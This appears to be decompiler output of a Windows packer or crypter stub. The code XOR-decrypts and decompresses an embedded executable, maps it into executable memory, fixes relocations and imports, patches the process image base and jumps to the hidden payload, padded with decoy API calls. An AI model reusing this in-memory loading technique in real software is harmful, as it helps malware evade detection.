int global15 = 0;
__size32 global26 = 0;// 4 bytes
unsigned int global52 = 0x4051;
DWORD global53 = 0x5400;
__size32 global58 = 0;// 4 bytes
__size32 global62 = 0;// 4 bytes
__size32 global63 = 0;// 4 bytes
int global64 = 0;

INT_PTR proc1(int hwndDlg, int uMsg, int wParam, int lParam);
__size32 proc2(DWORD param1);
void proc3(unsigned int param1, int param2, unsigned int param3, unsigned int param4, unsigned int param5, unsigned char *param6, void *param7, unsigned int param8);
void proc4(__size32 param1, __size32 *param2, void *param3);
void proc5(unsigned int param1, unsigned char *param2);
__size32 proc6(unsigned int *param1, unsigned char *param2);
__size8 proc7(unsigned char *param1, unsigned char *param2, int param3);
__size32 proc8(HANDLE param1, char *param2);
void proc9(__size32 param1);

// address: 0x401300
void _start(unsigned int param1, unsigned int param2, int param3, unsigned int param4, unsigned int param5, unsigned int param6, __size32 param9, void *param9, __size32 param9) {
    __size32 eax; 		// r24
    HINSTANCE eax_1; 		// r24{35}
    __size32 ecx; 		// r25
    __size32 edx; 		// r26
    int esp; 		// r28
    unsigned int local7; 		// m[esp - 8]

    COMCTL32_dll_17();
    LoadCursorA(0, 0x7f00);
    GetCommandLineA();
    eax_1 = GetModuleHandleA();
    eax = RegOpenKeyA();
    if (eax == 0) {
        local7 = 0;
        while (local7 < global52) {
            edx = local7 + 0x404000;
            eax = *(edx + 8);
            ecx = local7 + 0x404000;
            *(int*)(ecx + 8) = eax ^ 0x891100;
            local7 += 8;
        }
        eax = proc2(global53);
        global58 = eax;
        ecx = *0x4080d4;
        proc3(param2, param3, param4, param5, param6, 0x404008, ecx, global52);
        ecx = *24;
        global26 = ecx;
        global62 = param9;
        *(void **)0x4080c4 = param9;
        global63 = param9;
        global64 = (esp - 4);
        proc4(0x401435 - eax_1, eax_1, param9);
        edx = *0x4080d4;
        proc5(param1, edx);
/* goto m[0x4080dc]*/
    }
    DialogBoxParamA(eax_1, 1000, 0, 0x401280, 0);
    return;
}

// address: 0x401280
INT_PTR proc1(int hwndDlg, int uMsg, int wParam, int lParam) {
    return 0;
}

// address: 0x401960
__size32 proc2(DWORD param1) {
    __size32 eax; 		// r24

    eax = GetProcessHeap();
    eax = HeapAlloc(eax, 0, param1);
    return eax;
}

// address: 0x4010a0
void proc3(unsigned int param1, int param2, unsigned int param3, unsigned int param4, unsigned int param5, unsigned char *param6, void *param7, unsigned int param8) {
    unsigned char cl; 		// r9
    unsigned char dl; 		// r10
    unsigned int eax; 		// r24
    unsigned char *eax_1; 		// r24
    unsigned int eax_2; 		// r24{111}
    unsigned int ecx; 		// r25
    unsigned char *edx; 		// r26
    int esp; 		// r28
    unsigned int local0; 		// m[esp - 52]
    unsigned int local1; 		// m[esp - 12]
    unsigned int local11; 		// local8{263}
    unsigned int local12; 		// param4{267}
    union { void * x293; int x294; } local13; 		// param2{269}
    unsigned int local14; 		// param1{270}
    unsigned int local15; 		// local4{276}
    union { void * x293; int x294; } local16; 		// local5{278}
    unsigned int local17; 		// local6{279}
    unsigned int local18; 		// local4{283}
    union { void * x293; int x294; } local19; 		// local5{285}
    unsigned int local2; 		// m[esp - 24]
    unsigned int local20; 		// local6{286}
    unsigned int local3; 		// m[esp + 12]
    unsigned int local4; 		// m[esp - 28]
    union { void * x293; int x294; } local5; 		// m[esp - 56]
    unsigned int local6; 		// m[esp - 60]
    unsigned int local8; 		// m[esp + 12]{263}

    eax = RegOpenKeyA();
    local11 = param8;
    local12 = param4;
    local13 = param2;
    local14 = param1;
    if (eax != 0) {
        dl = *param6;
        local1 = 1;
        local2 = 0;
        do {
            local8 = local11;
            param4 = local12;
            param2 = local13;
            param1 = local14;
            eax_1 = param6 + local1;
            cl = *eax_1;
            local1++;
            local15 = param4;
            local16 = param2;
            local17 = param1;
            local18 = param4;
            local19 = param2;
            local20 = param1;
            if ((cl) != (dl)) {
                eax_1 = param7 + local2;
                *(unsigned char*)eax_1 = cl;
                local2++;
            } else {
                eax_1 = param6 + local1;
                ecx = *(unsigned char*)eax_1;
                if (ecx != 0) {
                    eax_1 = param6 + local1;
                    eax = proc6(&param5, eax_1);
                    eax_2 = eax + local1;
                    eax_1 = param6 + eax_2;
                    local0 = eax_1;
                    local5 = esp - 36;
                    eax = proc6(&param3, eax_1);
                    local16 = local5;
                    local17 = local6;
                    local1 = eax + eax_2;
                    local4 = 0;
                    local15 = local4;
                    while (local4 < param5) {
                        ecx = local2 - param3;
                        edx = param7 + local2;
                        cl = *(param7 + ecx);
                        *(unsigned char*)edx = cl;
                        local2++;
                        local4++;
                        local15 = local4;
                    }
                } else {
                    edx = param7 + local2;
                    *(unsigned char*)edx = dl;
                    local2++;
                    local1++;
                }
                local4 = local15;
                local5 = local16;
                local6 = local17;
                local18 = local4;
                local19 = local5;
                local20 = local6;
            }
            local3 = local8;
            local4 = local18;
            local5 = local19;
            local6 = local20;
            local11 = local3;
            local12 = local4;
            local13 = local5;
            local14 = local6;
        } while (local1 < local8);
    }
    return;
}

// address: 0x401480
void proc4(__size32 param1, __size32 *param2, void *param3) {
    __size32 eax; 		// r24
    int eax_1; 		// r24{57}
    __size32 ecx; 		// r25
    __size32 edx; 		// r26
    __size32 *edx_2; 		// r26{14}
    void *esi; 		// r30
    void *local10; 		// esi{166}
    void **local6; 		// m[esp - 12]
    void *local7; 		// m[esp - 28]
    __size32 *local8; 		// m[esp - 8]
    void *local9; 		// param3{158}

    edx_2 = param2 + *(param2 + 60);
    ecx = *(edx_2 + 80);
    eax = VirtualAlloc(0, ecx, 0x3000, 64);
    local9 = param3;
    global15 = eax;
    if (*0x4080c0 != 0) {
        eax = *(edx_2 + 80);
        edx = *0x4080c0;
        proc7(edx, param2, eax);
        eax = *0x4080c0;
        eax_1 = eax - param2;
        if (*(edx_2 + 164) != 0) {
            eax = param2 + *(edx_2 + 160);
            local6 = eax;
            param3 = local9;
            local10 = param3;
            while (*(local6 + 4) != 0) {
                eax = *(local6 + 4);
                local7 = local6 + 8;
                local8 = 0;
L6:
                esi = local10;
                local9 = esi;
                if (local8 < (eax - 8) / 2) {
                    eax = *(unsigned short*)(local7 + local8 * 2);
                    if ((int)eax >> 12 == 3) {
                        edx = global15 + *local6;
                        eax = *(unsigned short*)(local7 + local8 * 2);
                        ecx = *(edx + (eax & 0xfff));
                        edx = *(unsigned short*)(local7 + local8 * 2);
                        esi = global15 + *local6;
                        *(void **)(esi + (edx & 0xfff)) = ecx + eax_1;
                    }
                    local10 = esi;
                    local8++;
                    goto L6;
                }
                edx = local6 + *(local6 + 4);
                local6 = edx;
                param3 = local9;
                local10 = param3;
            }
        }
        eax = param1 + global15;
/* goto eax*/
    }
    return;
}

// address: 0x4015f0
void proc5(unsigned int param1, unsigned char *param2) {
    __size32 eax; 		// r24
    int eax_1; 		// r24
    unsigned char *eax_2; 		// r24{33}
    HANDLE eax_3; 		// r24{180}
    int *ecx; 		// r25
    int *ecx_1; 		// r25
    unsigned int *ecx_2; 		// r25{132}
    __size32 *edx; 		// r26
    DWORD edx_1; 		// r26
    void *esp; 		// r28
    unsigned char *local0; 		// m[esp - 32]
    unsigned int local10; 		// m[esp - 100]
    int *local12; 		// m[esp - 28]
    int *local13; 		// m[esp - 44]
    __size32 local14; 		// m[esp - 16]
    unsigned char *local23; 		// m[esp - 8]{401}
    unsigned int local24; 		// m[esp - 8]{417}
    unsigned int local25; 		// param1{539}
    unsigned int local26; 		// local10{547}
    DWORD local4; 		// m[esp - 68]
    unsigned char *local5; 		// m[esp - 72]
    unsigned char *local6; 		// m[esp - 76]
    unsigned int local7; 		// m[esp - 80]
    unsigned int local8; 		// m[esp - 12]
    int *local9; 		// m[esp - 64]

    edx = param2 + *(param2 + 60);
    ecx = *(unsigned short*)(edx + 20);
    local0 = edx + ecx + 24;
    edx_1 = *(edx + 80);
    eax_2 = VirtualAlloc(0, edx_1, 0x3000, 64);
    local25 = param1;
    if (eax_2 != 0) {
        ecx = *(param2 + 60);
        eax_1 = *(unsigned short*)(edx + 6);
        local4 = ecx + eax_1 * 40 + 312;
        local5 = param2;
        local6 = eax_2;
        proc7(eax_2, param2, local4);
        local8 = 0;
        eax_1 = *(unsigned short*)(edx + 6);
        while (local8 < eax_1) {
            if ( !(*(local0 + 20) == 0 || *(local0 + 16) == 0)) {
                ecx = *(local0 + 16);
                eax = *(edx + 60);
                tmpl = (ecx + eax - 1);
                tmp2 = *(edx + 60);
                eax_1 = *(edx + 60) * tmpl / tmp2;
                local4 = eax_1;
                ecx_1 = param2 + *(local0 + 20);
                local5 = ecx_1;
                eax = eax_2 + *(local0 + 12);
                local6 = eax;
                proc7(eax, ecx_1, eax_1);
            }
            local0 += 40;
            local8++;
            eax_1 = *(unsigned short*)(edx + 6);
        }
        ecx_2 = eax_2 + *(eax_2 + 60);
        eax = CreateFileMappingA();
        if (eax != 0) {
            edx = eax_2 + *(ecx_2 + 128);
            local9 = edx;
            param1 = local25;
            local26 = param1;
            local26 = param1;
            while (*(local9 + 16) != 0) {
                edx = eax_2 + *(local9 + 12);
                eax_3 = LoadLibraryA(edx);
                if (*local9 == 0) {
                    eax = eax_2 + *(local9 + 16);
                    local12 = eax;
                    edx = eax_2 + *local9;
                    local13 = edx;
                } else {
                    edx = eax_2 + *local9;
                    local12 = edx;
                    ecx = eax_2 + *(local9 + 16);
                    local13 = ecx;
                }
                local14 = 0;
                if ( !(*(local9 + 16) == 0 || *local9 == 0)) {
                    local14 = 1;
                }
L27:
                local10 = local26;
                local25 = local10;
                if (*local12 != 0) {
                    ecx = *local12;
                    if ((ecx & 0x80000000) == 0) {
                        ecx = *local12;
                        eax_1 = proc8(eax_3, ecx + eax_2 + 2);
                        *(union { int * x243; int x244; }*)local12 = eax_1;
                    } else {
                        eax = *local12;
                        eax_1 = proc8(eax_3, eax & 0x7fffffff);
                        *(union { int * x243; int x244; }*)local12 = eax_1;
                    }
                    local26 = local10;
                    local26 = local10;
                    if (*local12 != 0) {
                        if (local14 != 0) {
                            eax = *local12;
                            *(union { union { int * x243; unsigned int x244; } * x243; int x244; }*)local13 = eax;
                        }
                        local12 += 4;
                        local13 += 4;
                        goto L27;
                    } else {
                        goto L0;
                    }
                    goto L0;
                }
                local9 += 20;
                param1 = local25;
                local26 = param1;
                local26 = param1;
            }
            eax = MapViewOfFileEx(); /* Warning: also results in esp */
            global15 = eax;
            if (*0x4080c0 != 0) {
L3:
                ecx = *(ecx_2 + 80);
                *(__size32*)(esp - 4) = ecx;
                local23 = eax_2;
                local8 = global15;
                proc7(*(esp - 12), *(esp - 8), *(esp - 4));
                *(__size32*)(esp - 4) = global15;
                proc9(*(esp - 4));
                eax = *0x4080c0;
                eax += *(ecx_2 + 40);
                *(union { unsigned char * x245; int x246; }*)0x4080dc = eax;
                edx = *0x4080dc;
                *(__size32 **)(ecx_2 + 40) = edx;
            } else {
                eax = UnmapViewOfFile();
                if (eax != 0) {
L8:
                    eax = MapViewOfFileEx(); /* Warning: also results in esp */
                    global15 = eax;
                    if (*0x4080c0 != 0) {
                        goto L3;
                    } else {
                        eax = *(ecx_2 + 80);
                        edx = *(ecx_2 + 52);
                        eax = VirtualAlloc(edx, eax, 0x3000, 64); /* Warning: also results in esp */
                        global15 = eax;
                        if (*0x4080c0 != 0) {
                            goto L3;
                        } else {
                        }
                    }
                } else {
                    ecx = *(ecx_2 + 52);
                    eax = VirtualFree(ecx, 0, 0x8000);
                    if (eax != 0) {
                        goto L8;
                    } else {
                    }
                }
            }
        } else {
        }
    } else {
    }
L0:
    return;
}

// address: 0x4011d0
__size32 proc6(unsigned int *param1, unsigned char *param2) {
    int eax; 		// r24
    int ecx; 		// r25
    unsigned int local2; 		// m[esp - 8]
    __size32 local3; 		// m[esp - 16]
    unsigned char *local4; 		// m[esp + 8]
    unsigned char *local5; 		// param2{62}

    LoadIconA(0, 0x7f00);
    local5 = param2;
    local2 = 0;
    local3 = 0;
    do {
        param2 = local5;
        ecx = *(unsigned char*)param2;
        local4 = param2 + 1;
        eax = local2 * 128 | ecx & 0x7f;
        local2 = eax;
        local3++;
        local5 = local4;
    } while ((ecx & 0x80) != 0);
    *(unsigned int*)param1 = eax;
    return local3;
}

// address: 0x401060
__size8 proc7(unsigned char *param1, unsigned char *param2, int param3) {
    unsigned char cl; 		// r9
    unsigned char *eax; 		// r24
    unsigned char *edx; 		// r26
    int local0; 		// m[esp - 8]

    local0 = 0;
    while (local0 < param3) {
        edx = param1 + local0;
        eax = param2 + local0;
        cl = *eax;
        *(unsigned char*)edx = cl;
        local0++;
    }
    return (unsigned char) local0;
}

// address: 0x4015d0
__size32 proc8(HANDLE param1, char *param2) {
    __size32 eax; 		// r24

    eax = GetProcAddress(param1, param2);
    return eax;
}

// address: 0x401930
void proc9(__size32 param1) {
    __size32 eax; 		// r24

    eax = *(global26 + 48);
    *(__size32*)(eax + 8) = param1;
    return;
}

